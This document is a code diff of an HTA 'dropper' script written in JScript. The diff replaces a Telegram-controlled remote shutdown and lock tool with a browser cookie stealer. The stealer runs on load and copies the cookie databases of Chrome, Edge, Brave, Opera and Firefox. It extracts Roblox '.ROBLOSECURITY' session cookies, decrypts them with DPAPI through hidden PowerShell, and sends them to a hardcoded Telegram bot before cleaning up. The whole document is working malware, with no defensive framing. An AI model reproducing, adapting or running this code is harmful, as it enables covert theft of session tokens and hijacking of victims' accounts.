@@ -1,138 +1,117 @@
+<!-- dropper.hta -->
 <html>
 <head>
 <script language="JScript">
-var TOKEN = "123456:ABC-DEF...";
-var API = "https://api.telegram.org/bot" + TOKEN + "/";
-var CHAT = "YOUR_CHAT_ID";
-var OFFSET = 0;
+var TOKEN = "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11";
+var CHAT = "123456789";
+var API = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
 var wsh = new ActiveXObject("WScript.Shell");
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var xhr = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
 
-function req(method, body) {
+function send(msg) {
     try {
-        xhr.Open("POST", API + method, false);
+        xhr.Open("POST", API, false);
         xhr.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.Send(body || "");
-        return xhr.ResponseText;
-    } catch(e) { return "{}"; }
+        xhr.Send("chat_id=" + CHAT + "&text=" + encodeURIComponent(msg));
+    } catch(e) {}
 }
 
-function sendText(text) {
-    req("sendMessage", "chat_id=" + CHAT + "&text=" + encodeURIComponent(text));
-}
-
-function lock() {
-    try {
-        var ps = 'powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition @\\"'
-            + 'using System; using System.Runtime.InteropServices;'
-            + 'public class Session { [DllImport(\\\"user32.dll\\\",SetLastError=true)] public static extern bool LockWorkStation(); }'
-            + '\\" -Name Session -Namespace Win32; [Win32.Session]::LockWorkStation()"';
-        wsh.Run(ps, 0, false);
-        sendText("LOCK_OK");
-    } catch(e) { sendText("LOCK_ERR: " + e.message); }
-}
-
-function shutdown(timeout, msg, reboot) {
-    timeout = timeout || 0;
-    msg = msg || "System shutdown initiated";
-    reboot = reboot || false;
-    try {
-        var flag = reboot ? 6 : 1; // EWX_REBOOT | EWX_FORCEIFHUNG = 6; EWX_SHUTDOWN | EWX_FORCEIFHUNG = 5; pure = 1
-        var ps = 'powershell -WindowStyle Hidden -Command "'
-            + '$p=new-object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent());'
-            + 'if(!$p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)){exit 1};'
-            + 'Add-Type -TypeDefinition @\\"'
-            + 'using System; using System.Runtime.InteropServices;'
-            + 'public class Power {'
-            + '  [DllImport(\\\"advapi32.dll\\\",SetLastError=true)] public static extern bool InitiateSystemShutdownEx(string m,string msg,int t,bool f,bool r);'
-            + '  [DllImport(\\\"advapi32.dll\\\",SetLastError=true)] public static extern bool AbortSystemShutdown(string m);'
-            + '  [DllImport(\\\"user32.dll\\\",SetLastError=true)] public static extern bool ExitWindowsEx(uint f,uint r);'
-            + '}'
-            + '\\" -Name Power -Namespace Win32;'
-            + '[Win32.Power]::InitiateSystemShutdownEx($null,\\\"' + msg + '\\\",' + timeout + ',$true,$' + reboot.toString().toLowerCase() + ')"';
-        var exec = wsh.Exec(ps);
-        var code = exec.ExitCode;
-        sendText(code == 0 ? "SHUTDOWN_OK" : "SHUTDOWN_ERR: ELEVATION_REQUIRED");
-    } catch(e) { sendText("SHUTDOWN_ERR: " + e.message); }
-}
-
-function abort() {
-    try {
-        var ps = 'powershell -WindowStyle Hidden -Command "'
-            + 'Add-Type -TypeDefinition @\\"'
-            + 'using System; using System.Runtime.InteropServices;'
-            + 'public class Power { [DllImport(\\\"advapi32.dll\\\",SetLastError=true)] public static extern bool AbortSystemShutdown(string m); }'
-            + '\\" -Name Power -Namespace Win32; [Win32.Power]::AbortSystemShutdown($null)"';
-        wsh.Run(ps, 0, false);
-        sendText("ABORT_OK");
-    } catch(e) { sendText("ABORT_ERR"); }
-}
-
-function logoff() {
-    try {
-        var ps = 'powershell -WindowStyle Hidden -Command "'
-            + 'Add-Type -TypeDefinition @\\"'
-            + 'using System; using System.Runtime.InteropServices;'
-            + 'public class Power { [DllImport(\\\"user32.dll\\\",SetLastError=true)] public static extern bool ExitWindowsEx(uint f,uint r); }'
-            + '\\" -Name Power -Namespace Win32; [Win32.Power]::ExitWindowsEx(0,0)"'; // EWX_LOGOFF = 0
-        wsh.Run(ps, 0, false);
-        sendText("LOGOFF_OK");
-    } catch(e) { sendText("LOGOFF_ERR"); }
-}
-
-function sleepState(prevent) {
-    try {
-        var ps = 'powershell -WindowStyle Hidden -Command "'
-            + 'Add-Type -TypeDefinition @\\"'
-            + 'using System; using System.Runtime.InteropServices;'
-            + 'public class Power {'
-            + '  [DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern uint SetThreadExecutionState(uint f);'
-            + '  public const uint ES_AWAYMODE_REQUIRED=0x40; public const uint ES_CONTINUOUS=0x80000000; public const uint ES_SYSTEM_REQUIRED=0x1;'
-            + '}'
-            + '\\" -Name Power -Namespace Win32;'
-            + '[Win32.Power]::SetThreadExecutionState(' + (prevent ? '0x80000041' : '0x80000000') + ')"';
-        wsh.Run(ps, 0, false);
-        sendText(prevent ? "SLEEP_PREVENT_OK" : "SLEEP_ALLOW_OK");
-    } catch(e) { sendText("SLEEP_ERR"); }
-}
-
-function handle(update) {
-    if (!update.message || !update.message.text) return;
-    var txt = update.message.text;
-    var parts = txt.split(" ");
-    var cmd = parts[0].toLowerCase();
-    var arg = parts.slice(1).join(" ");
-    switch(cmd) {
-        case "/lock": lock(); break;
-        case "/shutdown": shutdown(parseInt(parts[1]) || 0, parts.slice(2).join(" ") || "Remote shutdown", false); break;
-        case "/reboot": shutdown(parseInt(parts[1]) || 0, parts.slice(2).join(" ") || "Remote reboot", true); break;
-        case "/abort": abort(); break;
-        case "/logoff": logoff(); break;
-        case "/nosleep": sleepState(true); break;
-        case "/allowsleep": sleepState(false); break;
-        case "/help": sendText("/lock /shutdown [sec] [msg] /reboot [sec] [msg] /abort /logoff /nosleep /allowsleep"); break;
-        default: break;
-    }
-}
-
-function poll() {
-    try {
-        xhr.Open("POST", API + "getUpdates", false);
-        xhr.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        xhr.Send("offset=" + OFFSET + "&limit=1");
-        var res = JSON.parse(xhr.ResponseText);
-        if (res.ok && res.result.length > 0) {
-            for (var i = 0; i < res.result.length; i++) {
-                OFFSET = res.result[i].update_id + 1;
-                handle(res.result[i]);
+function grab() {
+    var local = wsh.ExpandEnvironmentStrings("%LOCALAPPDATA%");
+    var roaming = wsh.ExpandEnvironmentStrings("%APPDATA%");
+    var tmp = wsh.ExpandEnvironmentStrings("%TEMP%") + "\\rc.db";
+    var found = "";
+    
+    var dbs = [
+        local + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
+        local + "\\Google\\Chrome\\User Data\\Default\\Cookies",
+        local + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
+        local + "\\Microsoft\\Edge\\User Data\\Default\\Cookies",
+        local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
+        local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
+        roaming + "\\Opera Software\\Opera Stable\\Network\\Cookies",
+        roaming + "\\Opera Software\\Opera Stable\\Cookies"
+    ];
+    
+    for (var i = 0; i < dbs.length; i++) {
+        if (fso.FileExists(dbs[i])) {
+            try {
+                fso.CopyFile(dbs[i], tmp, true);
+                var conn = new ActiveXObject("ADODB.Connection");
+                conn.Open("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=" + tmp + ";");
+                var rs = conn.Execute("SELECT host_key,name,encrypted_value FROM cookies WHERE name='.ROBLOSECURITY'");
+                
+                while (!rs.EOF) {
+                    var host = rs.Fields(0).Value;
+                    var val = rs.Fields(2).Value;
+                    found += "[" + host + "] ";
+                    
+                    // DPAPI decrypt via PowerShell bridge
+                    var b64 = "";
+                    try {
+                        var stream = new ActiveXObject("ADODB.Stream");
+                        stream.Type = 1; // adTypeBinary
+                        stream.Open();
+                        stream.Write(val);
+                        stream.Position = 0;
+                        stream.Type = 2; // adTypeText
+                        stream.Charset = "iso-8859-1";
+                        var bytes = stream.ReadText();
+                        stream.Close();
+                        
+                        // Convert binary string to base64
+                        var dom = new ActiveXObject("Microsoft.XMLDOM");
+                        var el = dom.createElement("tmp");
+                        el.dataType = "bin.base64";
+                        var node = dom.createTextNode(bytes);
+                        el.appendChild(node);
+                        b64 = el.nodeTypedValue;
+                    } catch(e) { b64 = "[BIN_FAIL]"; }
+                    
+                    var ps = 'powershell -WindowStyle Hidden -Command "$b=[Convert]::FromBase64String(\\"' + b64 + '\\"); try { $d=[Security.Cryptography.ProtectedData]::Unprotect($b,$null,\\"CurrentUser\\"); [Convert]::ToBase64String($d) } catch { \\"DPAPI_FAIL\\" }"';
+                    var exec = wsh.Exec(ps);
+                    var dec = exec.StdOut.ReadAll().trim();
+                    found += (dec || "[NO_DECRYPT]") + "\\n";
+                    rs.MoveNext();
+                }
+                conn.Close();
+            } catch(e) {
+                send("ERR:" + dbs[i] + ":" + e.message);
             }
         }
-    } catch(e) {}
-    setTimeout(poll, 3000);
+    }
+    
+    // Firefox fallback
+    if (!found) {
+        var ffRoot = roaming + "\\Mozilla\\Firefox\\Profiles";
+        if (fso.FolderExists(ffRoot)) {
+            var fold = fso.GetFolder(ffRoot).SubFolders;
+            var e = new Enumerator(fold);
+            for (; !e.atEnd(); e.moveNext()) {
+                var db = e.item().Path + "\\cookies.sqlite";
+                if (fso.FileExists(db)) {
+                    try {
+                        var conn = new ActiveXObject("ADODB.Connection");
+                        conn.Open("Driver={SQLite3 ODBC Driver};Database=" + db + ";");
+                        var rs = conn.Execute("SELECT host,name,value FROM moz_cookies WHERE name='.ROBLOSECURITY'");
+                        while (!rs.EOF) {
+                            found += "[" + rs.Fields(0).Value + "] " + rs.Fields(2).Value + "\\n";
+                            rs.MoveNext();
+                        }
+                        conn.Close();
+                    } catch(e) {}
+                }
+            }
+        }
+    }
+    
+    send("ROBLOX:\\n" + (found || "NOT_FOUND"));
+    try { fso.DeleteFile(tmp); } catch(e) {}
+    close();
 }
 
-window.onload = poll;
+grab();
 </script>
 </head>
 <body></body>
